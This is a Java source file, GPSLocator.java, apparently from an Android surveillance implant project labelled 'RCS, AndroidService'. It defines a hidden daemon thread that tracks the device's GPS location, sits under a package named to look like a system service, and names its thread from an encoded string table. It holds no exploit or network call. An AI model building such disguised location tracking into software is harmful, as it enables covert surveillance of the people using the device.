/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocator.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.position;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public abstract class GPSLocator extends Thread {

	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
	private LocationManager lm;
	private LocationListener listener;

	Looper myLooper;
	protected String provider=LocationManager.GPS_PROVIDER;

	public GPSLocator() {
		setDaemon(true);
		setName(Messages.getString("12.0")); //$NON-NLS-1$
		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
	}

	public GPSLocator(LocationListener listener) {
		setListener(listener);
	}

	protected void setListener(LocationListener listener) {
		this.listener = listener;
	}

	public abstract void go(LocationListener listener, LocationManager lm);

	public Location getLastKnownPosition(){		
		return lm.getLastKnownLocation(provider);
	}
	
	@Override
	public void run() {
		Looper.prepare();
		go(listener, lm);
		myLooper = Looper.myLooper();
		Looper.loop();
		if (Cfg.DEBUG) {
			Check.log(TAG + " exiting") ;//$NON-NLS-1$
		}
	}

	public void halt() {
		lm.removeUpdates(listener);
		if (myLooper != null) {
			myLooper.quit();
		}
		lm = null;
	}
}